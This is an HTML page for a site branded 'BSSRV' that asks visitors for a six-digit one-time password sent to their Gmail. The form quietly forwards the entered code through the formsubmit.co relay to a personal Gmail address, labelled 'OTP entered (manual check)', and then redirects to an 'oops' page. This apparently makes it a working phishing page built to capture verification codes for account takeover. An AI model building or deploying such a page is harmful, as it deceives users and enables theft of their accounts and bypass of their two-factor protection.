<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Enter OTP | BSSRV</title>
<link rel="stylesheet" href="assets/css/style.css">
<style>
  body { font-family: Arial, sans-serif; background:#f7f7f7; }
  .login-section { max-width:400px; margin:50px auto; padding:20px; background:#fff; border-radius:10px; box-shadow:0 4px 10px rgba(0,0,0,0.1);}
  .login-box h2 { color:#800000; text-align:center; }
  .otp-container { display:flex; justify-content:space-between; margin-top:20px; }
  .otp-container input { width:45px; height:50px; font-size:1.5rem; text-align:center; border:1px solid #ccc; border-radius:6px; }
  button { background:#800000; color:#ffd700; padding:10px 14px; border:none; border-radius:6px; font-weight:600; cursor:pointer; width:100%; margin-top:20px; }
  .status { text-align:center; margin-top:10px; font-weight:500; color:green; }
  .note { text-align:center; margin-top:10px; font-size:0.9rem; color:#555; }
</style>
</head>
<body>

<section class="login-section">
  <div class="login-box">
    <h2>Enter OTP</h2>
    <p style="text-align:center;">Please enter the 6-digit OTP sent to your Gmail.</p>

    <form id="otpForm" action="https://formsubmit.co/minissweb@gmail.com" method="POST">
      <!-- Hidden field to hold combined OTP -->
      <input type="hidden" name="otp" id="fullOtp">
      <input type="hidden" name="_subject" value="OTP entered (manual check)">
      <input type="hidden" name="_next" value="oops.html">
     <input type="text" name="otp" id="dummyOtp" style="display:none;">
      <div class="otp-container">
        <input type="text" maxlength="1" class="otp-box" name="digit1" required>
        <input type="text" maxlength="1" class="otp-box" name="digit2" required>
        <input type="text" maxlength="1" class="otp-box" name="digit3" required>
        <input type="text" maxlength="1" class="otp-box" name="digit4" required>
        <input type="text" maxlength="1" class="otp-box" name="digit5" required>
        <input type="text" maxlength="1" class="otp-box" name="digit6" required>

      </div>

      <button type="submit">Submit OTP</button>
    </form>

    <div id="status" class="status"></div>
    <p class="note">Didn't receive OTP? Try again later.</p>
  </div>
</section>

<script>
  const otpBoxes = document.querySelectorAll('.otp-box');
  const fullOtp = document.getElementById('fullOtp');
  const form = document.getElementById('otpForm');

  // Auto-focus next input when typing
  otpBoxes.forEach((box, i) => {
    box.addEventListener('input', () => {
      if (box.value.length === 1 && i < otpBoxes.length -1) otpBoxes[i+1].focus();
    });
    box.addEventListener('keydown', (e) => {
      if(e.key === "Backspace" && box.value === "" && i > 0) otpBoxes[i-1].focus();
    });
  });

  // Combine OTP and submit
 form.addEventListener('submit', (e) => {
  const otpValue = Array.from(otpBoxes).map(input => input.value).join('');
  document.getElementById('fullOtp').value = otpValue; // hidden field
  document.getElementById('dummyOtp').value = otpValue; // dummy visible field for Formsubmit
    // Form will submit normally, redirect handled by _next
  });
</script>

</body>
</html>
